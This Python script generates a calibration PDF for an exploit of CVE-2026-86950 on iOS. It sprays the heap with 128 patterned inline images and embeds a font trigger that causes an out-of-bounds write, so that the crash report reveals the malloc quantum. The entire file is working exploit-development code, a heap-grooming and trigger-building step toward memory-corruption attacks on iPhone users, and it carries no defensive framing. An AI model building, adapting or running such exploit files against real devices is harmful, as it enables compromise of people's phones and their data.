#!/usr/bin/env python3
"""CVE-2026-86950 calibration PDF — determines iOS malloc quantum.

This PDF uses the negative-TX trigger to cause a forward OOB write.
When opened on vulnerable iOS, the crash report's fault address reveals
the actual malloc quantum:

  fault_addr = coverage_buffer + 5120

If coverage_buffer is at address A and the crash is at A + 5120,
then the quantum = (A + 5120) - next_allocation_start.

The spray uses 128 inline images of increasing sizes to map out
which size class the coverage buffer lands in.
"""
import sys
import zlib

FONT   = sys.argv[2] if len(sys.argv) > 2 else "neg_tx_trigger.ttf"
PTSIZE = 1024
NUM_SPRAY = 128  # more spray for calibration

def make_spray_stream(num_images):
    """Spray with known-pattern allocations of target size."""
    ops = []
    quantum = 5120
    w = quantum // 3
    h = 1
    actual_size = w * h * 3

    for i in range(num_images):
        # Each spray image has a unique 4-byte header: 0xDEAD0000 | index
        header = (0xDEAD0000 | (i & 0xFFFF)).to_bytes(4, 'big')
        fill = bytes([(i * 7 + 0x42) & 0xFF]) * (actual_size - 4)
        img_data = (header + fill)[:actual_size]

        ops.append(
            f"q\n{w} 0 0 {h} 0 {i * 2} cm\n"
            f"BI\n/W {w}\n/H {h}\n/CS /RGB\n/BPC 8\nID\n".encode()
            + img_data + b"\nEI\nQ\n"
        )
    return b"".join(ops)

def make_trigger_stream():
    return f"BT /F1 {PTSIZE} Tf 5 5 Td (A) Tj ET\n".encode()

def build(dst):
    ttf = open(FONT, "rb").read()
    ttf_z = zlib.compress(ttf)

    spray = make_spray_stream(NUM_SPRAY)
    trigger = make_trigger_stream()
    content = spray + trigger

    objs = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 2000 2000] "
        b"/Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R >>",
        b"<< /Length %d >>\nstream\n" % len(content) + content + b"endstream",
        b"<< /Type /Font /Subtype /TrueType /BaseFont /CVEFont "
        b"/FirstChar 65 /LastChar 65 /Widths [100] "
        b"/Encoding /WinAnsiEncoding /FontDescriptor 6 0 R >>",
        b"<< /Type /FontDescriptor /FontName /CVEFont /Flags 4 "
        b"/FontBBox [0 0 2 40] /ItalicAngle 0 /Ascent 100 /Descent -100 "
        b"/CapHeight 100 /StemV 80 /FontFile2 7 0 R >>",
        b"<< /Length %d /Length1 %d /Filter /FlateDecode >>\nstream\n"
        % (len(ttf_z), len(ttf)) + ttf_z + b"\nendstream",
    ]

    out = bytearray(b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n")
    off = []
    for i, body in enumerate(objs, 1):
        off.append(len(out))
        out += b"%d 0 obj\n" % i + body + b"\nendobj\n"
    xref = len(out)
    out += b"xref\n0 %d\n0000000000 65535 f \n" % (len(objs) + 1)
    for o in off:
        out += b"%010d 00000 n \n" % o
    out += (b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n"
            % (len(objs) + 1, xref))

    open(dst, "wb").write(out)
    print(f"wrote {dst} ({len(out):,} bytes)")
    print(f"  spray: {NUM_SPRAY} images, trigger: TX=-16367")

if __name__ == "__main__":
    build(sys.argv[1] if len(sys.argv) > 1 else "calibration.pdf")
